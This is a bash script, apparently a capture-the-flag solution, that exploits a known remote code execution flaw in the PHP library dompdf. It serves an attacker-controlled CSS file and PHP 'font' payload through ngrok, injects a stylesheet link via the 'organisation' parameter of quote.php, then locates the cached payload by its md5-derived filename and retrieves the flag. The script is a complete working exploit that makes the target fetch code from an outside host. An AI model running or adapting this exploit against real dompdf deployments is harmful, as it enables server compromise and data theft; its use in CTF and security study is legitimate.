#!/bin/bash
# Usage: ./solve.sh <url>
# Example: ./solve.sh http://localhost:8080
# Dependencies: ngrok, jq, python3, curl
# Description: Exploit RCE in dompdf to read flag
#
# References: https://snyk.io/blog/security-alert-php-pdf-library-dompdf-rce/
# https://www.optiv.com/insights/source-zero/blog/exploiting-rce-vulnerability-dompdf
#
# Payload font copied from: https://github.com/snyk-labs/php-goof/blob/main/exploits/gotcha_font.php?raw=true

URL=$1

if [ -z "$URL" ]; then
    echo "Usage: $0 <url>"
    exit 1
fi

echo "Target url: $URL"

echo "Starting web server..."
python3 -m http.server 8000 --directory web > /dev/null &
python_pid=$!

echo "Starting ngrok..."
ngrok http 8000 > /dev/null &
ngrok_pid=$!
sleep 5

export NGROK_URL=$(curl -s localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url')

echo "Using ngrok url: $NGROK_URL"

echo "Generating malicious css..."
cat > ./web/malicious.css << EOF
@font-face {
    font-family: 'gotcha';
    src:url('$NGROK_URL/gotcha_font.php');
    font-style: 'normal';
    font-weight: 'normal';
}
EOF

echo "Sending payload..."
payload="/quote.php?organisation=%3Clink%20rel%3Dstylesheet%20href%3D%27$NGROK_URL%2Fmalicious.css%27%3E&email=test%40test.com&small=1&medium=1&large=1"
curl -s "$URL$payload" > /dev/null

echo "Waiting for malicious font to be downloaded..."
sleep 5

echo "Checking for flag in font file..."
HASH=$(echo -n "$NGROK_URL/gotcha_font.php" | md5sum | cut -d' ' -f1)
FONT_URL="$URL/dompdf/lib/fonts/gotcha_normal_$HASH.php"
FLAG=$(curl -s $FONT_URL --output - | strings |  grep -oE "flag{.*}")

echo "Flag: $FLAG"

echo "Cleaning up..."
rm ./web/malicious.css
kill "$ngrok_pid"
kill "$python_pid"
